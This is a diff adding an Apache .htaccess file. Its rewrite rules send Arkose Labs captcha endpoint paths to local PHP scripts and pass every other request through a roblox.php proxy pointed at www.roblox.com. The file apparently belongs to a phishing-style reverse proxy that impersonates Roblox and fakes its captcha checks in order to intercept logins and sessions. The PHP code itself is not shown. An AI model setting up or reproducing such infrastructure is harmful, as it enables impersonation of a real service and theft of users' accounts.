@@ -1,0 +1,54 @@
+<IfModule mime_module>
+  AddHandler application/x-httpd-ea-php81 .php .php8 .phtml
+</IfModule>
+Options -Indexes
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteCond %{REQUEST_URI} !^/eggywall/ [NC]
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteCond %{REQUEST_FILENAME}\.php -f
+RewriteRule ^(.*)$ $1.php [L]
+  RewriteRule ^v2/api.js/?$ /arkose/resources.php [L]
+  RewriteRule ^v2/(.*)/api.js/?$ /arkose/resources.php [L]
+  RewriteRule ^metrics/(.*)/?$ /arkose/system.php [L]
+  RewriteRule ^fc/gt2/public_key/(.*)/?$ /arkose/token.php [L]
+  RewriteRule ^v2/(.*)/settings/?$ /arkose/resources.php [L]
+  RewriteRule ^v2/(.*)/enforcement.(.*).html/?$ /arkose/resources.php [L]
+  RewriteRule ^v2/(.*)/enforcement.(.*).js/?$ /arkose/resources.php [L]
+  RewriteRule ^cdn/fc/assets/ /arkose/resources.php [L]
+  RewriteRule ^rtig/image/?$ /arkose/resources.php [L]
+  RewriteRule ^pows/(.*)/?$ /arkose/pow.php [L,QSA]
+  RewriteRule ^powseq/(.*)/(.*)/(.*)/?$ /arkose/resources.php [L]
+  RewriteRule ^fc/gfct/?$ /arkose/system.php [L]
+  RewriteRule ^fc/a/?$ /arkose/system.php [L]
+  RewriteRule ^fc/ca/?$ /arkose/system.php [L]
+  RewriteRule ^fc/(.*)/?$ /arkose/resources.php [L]
+  RewriteRule ^params/sri/dapib/(.*)/?$ /arkose/resources.php [L]
+  RewriteRule ^dapib/(.*)/(.*)/(.*)/?$ /arkose/resources.php [L]
+
+RewriteRule ^curl/(.*)$ /roblox.php?path=$1 [QSA,L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule ^(.*)$ /roblox.php?path=https://www.roblox.com/$1 [L,QSA]
+RewriteCond %{REQUEST_FILENAME} -d
+RewriteCond %{REQUEST_FILENAME}/index.php !-f
+RewriteCond %{REQUEST_FILENAME}/index.html !-f
+RewriteRule ^.*$ - [R=404,L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteRule ^ index.php [QSA,L]
+</IfModule>
+ErrorDocument 400 /request-error.php?code=400
+ErrorDocument 401 /request-error.php?code=401
+ErrorDocument 403 /request-error.php?code=403
+ErrorDocument 404 /request-error.php?code=404
+ErrorDocument 500 /request-error.php?code=500
+ErrorDocument 502 /request-error.php?code=502
+ErrorDocument 503 /request-error.php?code=503
+ErrorDocument 504 /request-error.php?code=504
+
+# php -- BEGIN cPanel-generated handler, do not edit
+# Set the “ea-php81” package as the default “PHP” programming language.
+<IfModule mime_module>
+  AddHandler application/x-httpd-ea-php81 .php .php8 .phtml
+</IfModule>
+# php -- END cPanel-generated handler, do not edit
